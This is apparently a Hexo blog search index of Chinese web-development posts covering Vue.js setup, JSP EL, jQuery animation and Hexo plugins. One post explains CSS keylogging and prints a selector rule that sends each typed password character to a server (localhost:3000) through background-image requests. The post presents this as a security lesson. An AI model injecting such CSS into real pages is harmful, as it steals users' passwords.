<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JSP Cookie 处理</title>
    <link href="undefined2019/12/03/Vue.js%20%E5%AE%89%E8%A3%85/"/>
    <url>2019/12/03/Vue.js%20%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue-js-安装"><a href="#Vue-js-安装" class="headerlink" title="Vue.js 安装"></a>Vue.js 安装</h1><h2 id="1、独立版本"><a href="#1、独立版本" class="headerlink" title="1、独立版本"></a>1、独立版本</h2><p>我们可以在 Vue.js 的官网上直接下载 vue.min.js 并用 **** 标签引入。</p><p><a href="https://vuejs.org/js/vue.min.js" target="_blank" rel="noopener">下载 Vue.js</a> </p><hr><h2 id="2、使用-CDN-方法"><a href="#2、使用-CDN-方法" class="headerlink" title="2、使用 CDN 方法"></a>2、使用 CDN 方法</h2><p>以下推荐国外比较稳定的两个 CDN，国内还没发现哪一家比较好，目前还是建议下载到本地。</p><ul><li><strong>Staticfile CDN（国内）</strong> : <a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a></li><li><strong>unpkg</strong>：<a href="https://unpkg.com/vue/dist/vue.js" target="_blank" rel="noopener">https://unpkg.com/vue/dist/vue.js</a>, 会保持和 npm 发布的最新的版本一致。</li><li><strong>cdnjs</strong> : <a href="https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js" target="_blank" rel="noopener">https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js</a></li></ul><h2 id="Staticfile-CDN（国内）"><a href="#Staticfile-CDN（国内）" class="headerlink" title="Staticfile CDN（国内）"></a>Staticfile CDN（国内）</h2><div id="app">   <p></p> </div><h2 id="unpkg（推荐）"><a href="#unpkg（推荐）" class="headerlink" title="unpkg（推荐）"></a>unpkg（推荐）</h2><div id="app">   <p></p> </div><h2 id="cdnjs"><a href="#cdnjs" class="headerlink" title="cdnjs"></a>cdnjs</h2><div id="app">   <p></p> </div><hr><h2 id="3、NPM-方法"><a href="#3、NPM-方法" class="headerlink" title="3、NPM 方法"></a>3、NPM 方法</h2><p>由于 npm 安装速度慢，本教程使用了淘宝的镜像及其命令 cnpm，安装使用介绍参照：<a href="">使用淘宝 NPM 镜像</a>。</p><p>npm 版本需要大于 3.0，如果低于此版本需要升级它：</p><pre><code># 查看版本$ npm -v2.3.0#升级 npmcnpm install npm -g# 升级或安装 cnpmnpm install cnpm -g</code></pre><p>在用 Vue.js 构建大型应用时推荐使用 NPM 安装：</p><pre><code># 最新稳定版$ cnpm install vue</code></pre><hr><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><p>Vue.js 提供一个官方命令行工具，可用于快速搭建大型单页应用。</p><pre><code># 全局安装 vue-cli$ cnpm install --global vue-cli# 创建一个基于 webpack 模板的新项目$ vue init webpack my-project# 这里需要进行一些配置，默认回车即可This will install Vue 2.x version of the template.For Vue 1.x use: vue init webpack#1.0 my-project? Project name my-project? Project description A Vue.js project? Author runoob &lt;test@runoob.com&gt;? Vue build standalone? Use ESLint to lint your code? Yes? Pick an ESLint preset Standard? Setup unit tests with Karma + Mocha? Yes? Setup e2e tests with Nightwatch? Yes   vue-cli · Generated &quot;my-project&quot;.   To get started:     cd my-project     npm install     npm run dev   Documentation can be found at https://vuejs-templates.github.io/webpack</code></pre><p>进入项目，安装并运行： </p><pre><code>$ cd my-project$ cnpm install$ cnpm run dev DONE  Compiled successfully in 4388ms&gt; Listening at http://localhost:8080</code></pre><p>成功执行以上命令后访问 <a href="http://localhost:8080/，输出结果如下所示：" target="_blank" rel="noopener">http://localhost:8080/，输出结果如下所示：</a></p><p><img src="https:////www.runoob.com/wp-content/uploads/2017/01/56219E04-D156-43EC-AC59-BFE7E38A62C3.jpg" srcset="undefined" alt="img"></p><blockquote><p><strong>注意：</strong>Vue.js 不支持 IE8 及其以下 IE 版本。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用Css获取用户密码</title>
    <link href="undefined2019/12/02/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <url>2019/12/02/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><pre><code>input[type=&quot;password&quot;][value$=&quot;1&quot;] { background-image: url(&quot;http://localhost:3000/1&quot;); }</code></pre><p>解释如下：</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" srcset="undefined" alt="code"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>EL表达式</title>
    <link href="undefined2019/12/02/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>2019/12/02/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h5 id="1-el表达式-Expression-Language）"><a href="#1-el表达式-Expression-Language）" class="headerlink" title="1.el表达式(Expression Language）"></a>1.el表达式(Expression Language）</h5><p>   el表达式：是为了使JSP写起来更加简单;</p><p>以MVC模式设计程序,JSP只是<a href="https://baike.baidu.com/item/%E8%A7%86%E5%9B%BE/1302820" target="_blank" rel="noopener">视图</a>，视图的任务就是显示响应，而不是在JSP中做任何关于程序控制和业务逻辑的事情。所以在JSP页面中应该尽可能少的、或者是完全不出现Java代码。</p><h5 id="2-EL语法"><a href="#2-EL语法" class="headerlink" title="2.EL语法"></a>2.EL语法</h5><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以“${}”表示。</p><h5 id="3-与-运算符"><a href="#3-与-运算符" class="headerlink" title="3.[ ]与.运算符"></a>3.[ ]与.运算符</h5><p>EL 提供“.“和“[ ]“两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，如 . 或 - 等并非字母或数字的符号，就一定要使用“[ ]“。例如：</p><p>${ user. My-Name}应当改为${user[“My-Name”]}</p><p>如果要动态取值时，就可以用“[ ]“来做，而“.“无法做到动态取值。例如：</p><p>${sessionScope.user[data]}中data 是一个变量</p><h5 id="4-变量"><a href="#4-变量" class="headerlink" title="4.变量"></a>4.变量</h5><p>EL存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。</p><p>因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。</p><p>代码：</p><pre><code class="jsp">&lt;%@page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@page import=&quot;java.util.ArrayList&quot;%&gt;&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;%--用el表达式完成运算 --%&gt;    ${123+124}    ${123*124}    ${5&gt;18}    ${5&gt;3&amp;&amp;3&gt;5}    ${15&gt;12 and 13&lt;14}    ${12&lt;11 or 11&gt;8}    ${5!=3}    &lt;%--empty运算符的使用 --%&gt;    &lt;%       String str=null;    %&gt;    ${empty str}    ${not empty str}    &lt;%--用el表达式获取域对象的数据--%&gt;    &lt;%      request.setAttribute(&quot;ell&quot;, &quot;good night&quot;);      String ell=(String)request.getAttribute(&quot;ell&quot;);      out.write(ell);    %&gt;     ${ell}    &lt;%--会从四个域对象中，一个一个找ell属性          先找 pageContext是否有ell属性，如果有就停止查找    直接输出ell属性对应的内容。如果没有继续查找request    对象中是否有ell属性，以此类推，直到查找到为止--%&gt;    ${requestScope.ell}    &lt;%--以上是只查找request对象的属性 --%&gt;     ${sessionScope.ell}    ${applicationScope.ell}    &lt;%--el表达式获取集合数组中的数据--%&gt;    &lt;%      ArrayList&lt;String&gt; list=new ArrayList&lt;String&gt;();      list.add(&quot;abc&quot;);      list.add(&quot;bbb&quot;);      list.add(&quot;ccc&quot;);      HashMap&lt;String,String&gt; map=new HashMap&lt;String,String&gt;();      map.put(&quot;aa&quot;, &quot;moring&quot;);      map.put(&quot;bb&quot;,&quot;afternoon&quot;);      map.put(&quot;cc&quot;,&quot;night&quot;);      request.setAttribute(&quot;list1&quot;, list);      request.setAttribute(&quot;map1&quot;, map);    %&gt;    ${requestScope.list1[1]}    ${map1.bb}&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于jQuery中“animate()”函数对颜色变化的支持</title>
    <link href="undefined2019/12/01/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/"/>
    <url>2019/12/01/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<p>我要做得就是让下面一段代码生效：</p><pre><code class="javascript">$(&quot;#yourid&quot;).stop().animate({ &quot;backgroundColor&quot; : &quot;#rrggbb&quot;, &quot;color&quot; : &quot;#rrggbb&quot; }, &quot;fast&quot;);</code></pre><p>　　但是，很遗憾，一点也没有动。本来效果应该跟这个版本的xcoder博客的天头导航条一样有个动态效果（只不过xcoder的导航条是透明度变化，而项目中我想让它背景色变化）。</p><p>　　原因是什么呢？死月上网查了很久，找到的东西都很简单地说明了一下，貌似都可以。嘛，也许是jQuery新版本不支持这个特性了吧。</p><p>　　最后，死月在jQuery的官方文档中找到了下面这段话——</p><blockquote><p>All animated properties should be animated to <strong><em>a single numeric value\</em></strong>, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the <a href="https://github.com/jquery/jquery-color" target="_blank" rel="noopener">jQuery.Color()</a> plugin is used). Property values are treated as a number of pixels unless otherwise specified. The units em and % can be specified where applicable.</p><p>—— <a href="http://api.jquery.com/animate/" target="_blank" rel="noopener">jQuery官方文档 .animate()</a></p></blockquote><p>　　大致的意思就是说所有动画属性都必须是一个单数字值，所以说大多数非数字的属性是不能被动画化的。例如高度、宽度等可以被动画化，但是背景色就不信了。<strong><em>除非你用了jQuery.Color()插件\</em></strong>。</p><p>　　所以说问题找到了，我们必须得用一个jQuery.Color()插件来对一些颜色进行动画操作。</p><p>　　话不多说，我们去下一个jQuery.Color()插件。把它加在我们的页面中，然后就可以用如下方式来进行动画操作了：</p><pre><code class="javascript">$(this).stop().animate({    &quot;backgroundColor&quot; : jQuery.Color(&quot;rrggbb&quot;),    &quot;color&quot; : jQuery.Color(&quot;rrggbb&quot;)}, &quot;fast&quot;);</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客常用插件及用法</title>
    <link href="undefined2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8F%8A%E7%94%A8%E6%B3%95/"/>
    <url>2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8F%8A%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="hexo-autonofollow"><a href="#hexo-autonofollow" class="headerlink" title="hexo-autonofollow"></a>hexo-autonofollow</h2><p>Github：<a href="https://github.com/liuzc/hexo-autonofollow" target="_blank" rel="noopener">https://github.com/liuzc/hexo-autonofollow</a></p><p>简介：自动为站外链接添加nofollow属性</p><p>安装：</p><pre><code>$ npm install hexo-autonofollow --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>nofollow:  enable: true  exclude:    - exclude1.com    - exclude2.com</code></pre><ul><li><strong>enable</strong> - 是否启用</li><li><strong>exclude</strong> - 排除域名</li></ul><h2 id="hexo-baidu-url-submit"><a href="#hexo-baidu-url-submit" class="headerlink" title="hexo-baidu-url-submit"></a>hexo-baidu-url-submit</h2><p>Github：<a href="https://github.com/huiwang/hexo-baidu-url-submit" target="_blank" rel="noopener">https://github.com/huiwang/hexo-baidu-url-submit</a></p><p>简介：主动推送Hexo博客新链接至百度搜索引擎，解决百度爬虫被禁止访问的问题，提升网站收录质量和速度。</p><p>安装：</p><pre><code>$ npm install hexo-baidu-url-submit --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>baidu_url_submit:  count: 1 ## 提交最新的一个链接  host: blog.cofess.com ## 在百度站长平台中注册的域名  token: your_token ## 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!  path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里</code></pre><ul><li><strong>token</strong> - 您得注册百度站长工具，然后在<strong>工具-&gt;网页抓取-&gt;链接提交</strong>里找到你的密匙。</li></ul><p>其次，_config.ym文件中url的值， 必须是百度站长平台注册的域名， 比如:</p><pre><code># URLurl: blog.cofess.comroot: /permalink: :year/:month/:day/:title/</code></pre><p>最后，加入新的deployer:</p><pre><code>deploy:- type: baidu_url_submitter</code></pre><p>执行<code>hexo deploy</code>的时候，新的链接就会被推送百度了。</p><h2 id="hexo-generator-feed"><a href="#hexo-generator-feed" class="headerlink" title="hexo-generator-feed"></a>hexo-generator-feed</h2><p>Github：<a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">https://github.com/hexojs/hexo-generator-feed</a></p><p>简介：RSS的生成插件，你可以在配置显示你站点的RSS，文件路径\atom.xml。</p><p>安装：</p><pre><code>$ npm install hexo-generator-feed --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>feed:  type: atom  path: atom.xml  limit: 20  hub:  content:</code></pre><ul><li><strong>type</strong> - Feed type. (atom/rss2)</li><li><strong>path</strong> - Feed path. (Default: atom.xml/rss2.xml)</li><li><strong>limit</strong> - Maximum number of posts in the feed (Use <code>0</code> or <code>false</code> to show all posts)</li><li><strong>hub</strong> - URL of the PubSubHubbub hubs (Leave it empty if you don’t use it)</li><li><strong>content</strong> - (optional) set to ‘true’ to include the contents of the entire post in the feed.</li></ul><h2 id="hexo-generator-sitemap"><a href="#hexo-generator-sitemap" class="headerlink" title="hexo-generator-sitemap"></a>hexo-generator-sitemap</h2><p>Github：<a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">https://github.com/hexojs/hexo-generator-sitemap</a></p><p>简介：生成博客的sitemap。</p><p>安装：</p><pre><code>$ npm install hexo-generator-sitemap --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>sitemap:    path: sitemap.xml</code></pre><h2 id="hexo-generator-baidu-sitemap"><a href="#hexo-generator-baidu-sitemap" class="headerlink" title="hexo-generator-baidu-sitemap"></a>hexo-generator-baidu-sitemap</h2><p>Github：<a href="https://github.com/coneycode/hexo-generator-baidu-sitemap" target="_blank" rel="noopener">https://github.com/coneycode/hexo-generator-baidu-sitemap</a></p><p>简介：生成博客的sitemap（针对百度）。</p><p>安装：</p><pre><code>$ npm install hexo-generator-baidu-sitemap --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>baidusitemap:path: baidusitemap.xml</code></pre><h2 id="hexo-generator-json-content"><a href="#hexo-generator-json-content" class="headerlink" title="hexo-generator-json-content"></a>hexo-generator-json-content</h2><p>Github：<a href="https://github.com/alexbruno/hexo-generator-json-content" target="_blank" rel="noopener">https://github.com/alexbruno/hexo-generator-json-content</a></p><p>简介：用于生成静态站点数据，提供搜索功能的数据源。</p><p>安装：</p><pre><code>$ npm install hexo-generator-json-content --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>jsonContent:  ignore:    - path/to/a/page    - url/to/one/post    - an-entire-category    - specific.file    - .ext # a file extension</code></pre><h2 id="hexo-neat"><a href="#hexo-neat" class="headerlink" title="hexo-neat"></a>hexo-neat</h2><p>Github：<a href="https://github.com/rozbo/hexo-neat" target="_blank" rel="noopener">https://github.com/rozbo/hexo-neat</a></p><p>简介：自动压缩html、css、js代码</p><p>安装：</p><pre><code>$ npm install hexo-neat --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>neat_enable: true</code></pre><p>压缩html代码</p><pre><code>neat_html:  enable: true  exclude:</code></pre><p>压缩CSS</p><pre><code>neat_css:  enable: true  exclude:    - &#39;*.min.css&#39;</code></pre><p>压缩JS</p><pre><code>neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - &#39;*.min.js&#39;</code></pre><h2 id="hexo-translate-title"><a href="#hexo-translate-title" class="headerlink" title="hexo-translate-title"></a>hexo-translate-title</h2><p>Github：<a href="https://github.com/cometlj/hexo-translate-title" target="_blank" rel="noopener">https://github.com/cometlj/hexo-translate-title</a></p><p>简介：使用Google翻译，百度翻译和有道翻译将Hexo文章中的汉字标题转成英文标题</p><p>安装：</p><pre><code>$ npm install hexo-translate-title --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>translate_title:  translate_way: google    #google | baidu | youdao  youdao_api_key: XXX  youdao_keyfrom: XXX  is_need_proxy: true     #true | false  proxy_url: http://localhost:4000</code></pre><p><strong>注意</strong>：判断是否需要配置google本地代理，如果没有被墙，请将<code>_config.yml</code>下的<code>is_need_proxy: true</code>改为false。如果设置为true,请设置本地代理地址</p><h2 id="hexo-wordcount"><a href="#hexo-wordcount" class="headerlink" title="hexo-wordcount"></a>hexo-wordcount</h2><p>Github：<a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">https://github.com/willin/hexo-wordcount</a></p><p>简介：为文章添加文章字数统计、文章预计阅读时间</p><p>安装：</p><pre><code>$ npm install hexo-wordcount --save</code></pre><p>使用：</p><p>通过以上安装后，你可以在你的模板文件加入以下相关的标签实现本插件的功能<br><strong>字数统计:</strong>WordCount<br><strong>阅读时长预计:</strong>Min2Read<br><strong>总字数统计:</strong> TotalCount</p><h2 id="hexo-generator-restful"><a href="#hexo-generator-restful" class="headerlink" title="hexo-generator-restful"></a>hexo-generator-restful</h2><p>Github：<a href="https://github.com/yscoder/hexo-generator-restful" target="_blank" rel="noopener">https://github.com/yscoder/hexo-generator-restful</a></p><p>简介：RESTful JSON数据生成插件。</p><p>安装：</p><pre><code>$ npm install hexo-generator-restful --save</code></pre><p>配置：</p><p>以下为默认配置，属性值为 <code>false</code> 表示不生成。</p><pre><code>restful:  # site 可配置为数组选择性生成某些属性  # site: [&#39;title&#39;, &#39;subtitle&#39;, &#39;description&#39;, &#39;author&#39;, &#39;since&#39;, email&#39;, &#39;favicon&#39;, &#39;avatar&#39;]  site: true        # hexo.config mix theme.config  posts_size: 10    # 文章列表分页，0 表示不分页  posts_props:      # 文章列表项的需要生成的属性    title: true    slug: true    date: true    updated: true    comments: true    path: true    excerpt: false    cover: true      # 封面图，取文章第一张图片    content: false    keywords: false    categories: true    tags: true  categories: true  # 分类数据  tags: true        # 标签数据  post: true        # 文章数据  pages: false      # 额外的 Hexo 页面数据, 如 About</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>面试要点整理</title>
    <link href="undefined2019/12/01/%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/"/>
    <url>2019/12/01/%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<ol><li>http相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#https" target="_blank" rel="noopener">https</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http2-0" target="_blank" rel="noopener">http2.0</a></li><li>http三次握手和四次挥手<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#三次握手" target="_blank" rel="noopener">三次握手</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#四次挥手" target="_blank" rel="noopener">四次挥手</a></li></ol></li><li>常见的http头<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#请求头：" target="_blank" rel="noopener">请求头：</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#响应头" target="_blank" rel="noopener">响应头</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#常见的http代码" target="_blank" rel="noopener">常见的http代码</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http方法" target="_blank" rel="noopener">http方法</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#浏览器输入url到最终显示过程" target="_blank" rel="noopener">浏览器输入url到最终显示过程</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#get请求和post请求的区别" target="_blank" rel="noopener">get请求和post请求的区别</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器主动推送" target="_blank" rel="noopener">服务器主动推送</a></li></ol></li><li>ajax相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#ajax的优点" target="_blank" rel="noopener">ajax的优点</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#ajax的缺点" target="_blank" rel="noopener">ajax的缺点</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xml和json的比较" target="_blank" rel="noopener">xml和json的比较</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js解析json的方法" target="_blank" rel="noopener">js解析json的方法</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xmlhttprequest的readystate取值" target="_blank" rel="noopener">xmlhttprequest的readystate取值</a></li></ol></li><li>web安全相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#csrf" target="_blank" rel="noopener">csrf</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xss" target="_blank" rel="noopener">xss</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#clickjacking" target="_blank" rel="noopener">clickjacking</a></li></ol></li><li>性能优化<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#内容优化" target="_blank" rel="noopener">内容优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器优化" target="_blank" rel="noopener">服务器优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js优化" target="_blank" rel="noopener">js优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#css优化" target="_blank" rel="noopener">css优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#图片优化" target="_blank" rel="noopener">图片优化</a></li></ol></li><li>vue相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#mvvm和mvc" target="_blank" rel="noopener">mvvm和mvc</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue双向数据绑定" target="_blank" rel="noopener">vue双向数据绑定</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue生命周期" target="_blank" rel="noopener">vue生命周期</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue组件通信" target="_blank" rel="noopener">vue组件通信</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vuex的作用" target="_blank" rel="noopener">vuex的作用</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue1-0和vue2-0的区别是什么" target="_blank" rel="noopener">vue1.0和vue2.0的区别是什么</a></li></ol></li><li>js相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#数据类型" target="_blank" rel="noopener">数据类型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#判断数据类型" target="_blank" rel="noopener">判断数据类型</a></li><li>高级函数<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#惰性载入函数" target="_blank" rel="noopener">惰性载入函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#安全的类型检测" target="_blank" rel="noopener">安全的类型检测</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#作用域安全的构造函数" target="_blank" rel="noopener">作用域安全的构造函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#函数柯里化" target="_blank" rel="noopener">函数柯里化</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#判断数组" target="_blank" rel="noopener">判断数组</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#箭头函数和this" target="_blank" rel="noopener">箭头函数和this</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#this指向" target="_blank" rel="noopener">this指向</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#作用域" target="_blank" rel="noopener">作用域</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#词法分析" target="_blank" rel="noopener">词法分析</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#构造函数" target="_blank" rel="noopener">构造函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#new的操作" target="_blank" rel="noopener">new的操作</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#promise和async-await" target="_blank" rel="noopener">promise和async/await</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#闭包" target="_blank" rel="noopener">闭包</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js对象私有变量" target="_blank" rel="noopener">js对象私有变量</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js垃圾回收机制" target="_blank" rel="noopener">js垃圾回收机制</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#原型链" target="_blank" rel="noopener">原型链</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#rhs和lhs" target="_blank" rel="noopener">rhs和lhs</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#EventLoop" target="_blank" rel="noopener">EventLoop</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#WebSocket" target="_blank" rel="noopener">WebSocket</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#继承" target="_blank" rel="noopener">继承</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#创建对象" target="_blank" rel="noopener">创建对象</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js跨域" target="_blank" rel="noopener">js跨域</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器推送" target="_blank" rel="noopener">服务器推送</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#多页面传参数" target="_blank" rel="noopener">多页面传参数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#深拷贝和浅拷贝" target="_blank" rel="noopener">深拷贝和浅拷贝</a></li><li>js事件模型<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM0级模型" target="_blank" rel="noopener">DOM0级模型</a></li><li><a 